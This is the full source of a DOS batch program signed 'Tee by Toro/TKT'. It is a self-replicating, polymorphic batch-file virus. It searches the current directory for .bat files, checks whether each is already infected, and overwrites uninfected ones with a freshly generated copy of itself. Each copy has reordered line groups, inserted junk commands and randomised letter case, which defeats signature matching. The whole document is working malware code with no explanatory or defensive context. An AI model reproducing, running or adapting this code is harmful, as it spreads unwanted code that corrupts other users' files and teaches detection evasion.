@echo off%T000%
rem Tee by Toro/TKT%T001%
if not %1!==! goto %1%T002%
set h=%0%T003%
if not exist %0 set h=%0.bat%T004%
for %%a in (%path%) do call %h% ff %%a find.exe find%T005%
for %%a in (%path%) do call %h% ff %%a command.com cs%T006%
set cx=%cs% /e:32768 /f /c %T007%
%cx%%h% s%T008%
@goto end%T009%
:ff %T010%
for %%a in (%2%3 %2\%3) do if exist %%a set %4=%%a%T011%
goto end%T012%
:s %T013%
set ax=for %%a in (0 1 2 3 4 5 6 7 8 9) do %T014%
set bx=f o r $0 %%%%%%%% A $0 i n $0 $1 0 $0 1 $0 2 $0 3 $0 4 $0 5 $0%T015%
set dx=6 $0 7 $0 8 $0 9 $2 $0 d o $0 c a l l  $0 %%%%%% 1 0 $0 %T016%
set t=%temp%%T017%
set o=%t%\o%T018%
set t1=%t%\a.bat%T019%
set t2=%t%\b%T020%
set j=at%T021%
for %%a in (*.b%j%) do call %h% inf %%a%T022%
goto end%T023%
:inf %T024%
truename %2 | %find% /i "%h%">g%T025%
if not errorlevel 1 goto end%T026%
rem>%o%%T027%
%cx%%h% p%T028%
%cx%%h% enc%T029%
echo :end>>%o%%T030%
type %o%>%2%T031%
goto end%T032%
:c3 %T033%
%ax%call %h% c2 %%a%T034%
goto end%T035%
:c2 %T036%
%ax%call %h% c1 %2%%a %2 %%a%T037%
goto end%T038%
:c1 %T039%
%ax%call %h% %label% %2%%a %3 %4 %%a%T040%
goto end%T041%
:enc %T042%
set label=mem%T043%
call %h% c3%T044%
:grp %T045%
if %grps%!==! goto end%T046%
call %h% rnd%T047%
set grp=%rnd%%T048%
set f=%T049%
for %%a in (%grps%) do if %grp%!==%%a! set f=1%T050%
if %f%!==! goto grp%T051%
:sec %T052%
set f=%T053%
echo if %%sec%grp%%%!==! set f=1>%t1%%T054%
call %t1%%T055%
if %f%!==1! goto rgrp%T056%
call %h% rnd%T057%
set sec=%rnd%%T058%
set f=%T059%
echo for %%%%a in (%%sec%grp%%%) do if %%%%a!==%sec%! set f=1>%t1%%T060%
call %t1%%T061%
if %f%!==! goto sec%T062%
:ln %T063%
echo if %%ln%grp%%sec%%%!==! set f=0>%t1%%T064%
call %t1%%T065%
if %f%!==0! goto rsec%T066%
call %h% rnd%T067%
set ln=%rnd%%T068%
set f=%T069%
echo for %%%%a in (%%ln%grp%%sec%%%) do if %%%%a!==%ln%! set f=1>%t1%%T070%
call %t1%%T071%
if %f%!==! goto ln%T072%
%find% "T%grp%%sec%%ln%" <%h% >>%o%%T073%
set f=%T074%
echo for %%%%a in (%%ln%grp%%sec%%%) do if not %%%%a!==%ln%! call %h% addf %%%%a>%t1%%T075%
echo set ln%grp%%sec%=%%f%%>>%t1%%T076%
call %t1%%T077%
goto grp%T078%
:rgrp %T079%
set f=%T080%
for %%a in (%grps%) do if not %%a!==%grp%! set f=%f% %%a%T081%
set grps=%f%%T082%
goto grp%T083%
:rsec %T084%
set f=%T085%
echo for %%%%a in (%%sec%grp%%%) do if not %%%%a!==%sec%! call %h% addf %%%%a>%t1%%T086%
echo set sec%grp%=%%f%%>>%t1%%T087%
call %t1%%T088%
goto sec%T089%
:addf %T090%
set f=%f% %2%T091%
goto end%T092%
:mem %T093%
%find% "T%2" <%h% >g%T094%
if errorlevel 1 goto end%T095%
echo set ln%3%4=%%ln%3%4%% %5>%t1%%T096%
if not %ogrp%!==%3! set grps=%grps% %3%T097%
if not %ogrp%!==%3! set ogrp=%3%T098%
if not %osec%!==%4! echo set sec%3=%%sec%3%% %4>>%t1%%T099%
if not %osec%!==%4! set osec=%4%T100%
call %t1%%T101%
goto end%T102%
:p %T103%
set label=pline%T104%
echo a|call%T105%
goto c2%T106%
:pline %T107%
%find% /i "poly%2" <%h% >%t1%%T108%
if errorlevel 1 goto end%T109%
set code2=%T110%
call %t1%%T111%
set pcode=%T112%
for %%a in (%code%) do call %h% proc %%a%T113%
for %%a in (%code2%) do call %h% proc %%a%T114%
call %h% wrt%T115%
:junk %T116%
set pcode=%T117%
call %h% rnd%T118%
%find% /i "junk%rnd%" <%h% >%t1%%T119%
call %t1%%T120%
for %%a in (%code%) do call %h% proc %%a%T121%
call %h% rnd%T122%
call %h% wrt%T123%
call %h% rnd%T124%
for %%a in (0 1 2 3 4 5 6 7 8) do if %%a==%rnd% goto junk%T125%
goto end%T126%
:wrt %T127%
echo prompt %pcode%$_>%t1%%T128%
%cx%%t1%>%t2%%T129%
%find% " " <%t2% | %find% /v "$">>%o%%T130%
goto end%T131%
:proc %T132%
for %%a in (0 1 2 3 4) do if %2!==$%%a! goto p%%a%T133%
set opa=%path%%T134%
path=%2%T135%
set f=%2%T136%
call %h% rnd%T137%
for %%a in (0 1 2 3 4) do if %%a==%rnd% set f=%path%%T138%
set pcode=%pcode%%f%%T139%
set path=%opa%%T140%
goto end%T141%
:p0 %T142%
set pcode=%pcode% %T143%
goto end%T144%
:p1 %T145%
set pcode=%pcode%(%T146%
goto end%T147%
:p2 %T148%
set pcode=%pcode%)%T149%
goto end%T150%
:p3 %T151%
set pcode=%pcode%"%T152%
goto end%T153%
:p4 %T154%
set pcode=%pcode%/%T155%
goto end%T156%
:rnd %T157%
echo @prompt echo %h% calcrnd $t $t$h $g %t%\~rnd.bat$_exit$_>%t%\~rnd.bat%T158%
%cx%%t%\~rnd.bat | %cs% >nul%T159%
%t%\~rnd.bat%T160%
:calcrnd %T161%
%ax%if %2!==%3%%a! set rnd=%%a%T162%
%ax%if %3!==%5%%a! set rnd=%%a%T163%
goto end%T164%
set code=c d $0 $g g %junk0%%junk5%%junk2%%T165%
set code=e c h o $0 a %%rnd%% $g g %junk1%%junk6%%T166%
set code=r e m $0 %junk3%%junk8%%junk7%%T167%
set code=s e t $g g $0 %junk4%%junk9%%T168%
set code=@ e c h o $0 o f f%poly00%%T169%
set code=i f $0 n o t $0 %%%%%% 1 1 ! $q $q ! $0 g o t o $0 %%%%%% 1 1%poly01%%T170%
set code=s e t $0 h $q %%%%%% 1 0%poly02%%T171%
set code=i f $0 n o t $0 e x i s t $0 %%%%%% 1 0 $0 s e t $0 h $q %%%%%% 1 0.b a t%poly03%%T172%
set code=e c h o $0 @ $g ~b .b a t%poly04%%T173%
set code=%bx%%poly05%%T174%
set code2=%dx%a $0 %%%%%%%% A%poly05%%T175%
set code=e c h o $0 :e n d $g $g ~b. b a t%poly06%%T176%
set code=~b .b a t $0%poly07%%T177%
set code=: a $0 %poly08%%T178%
set code=%bx%%poly09%%T179%
set code2=%dx%b $0 %%%%%% 1 2 %%%%%%%% A%poly09%%T180%
set code=g o t o $0 e n d%poly10%%T181%
set code=: b $0 %poly11%%T182%
set code=%bx%%poly12%%T183%
set code2=%dx%c $0 %%%%%% 1 2 %%%%%%%% A%poly12%%T184%
set code=g o t o $0 e n d%poly13%%T185%
set code=: c $0 %poly14%%T186%
set code=f i n d $0 $4 i $0 $3 t %%%%%% 1 2 $3 $0 $l %%%%%% 1 h %%%%%% 1 $0 $g $g ~b .b a t%poly15%%T187%
set code=g o t o $0 e n d%poly16%%T188%
:end
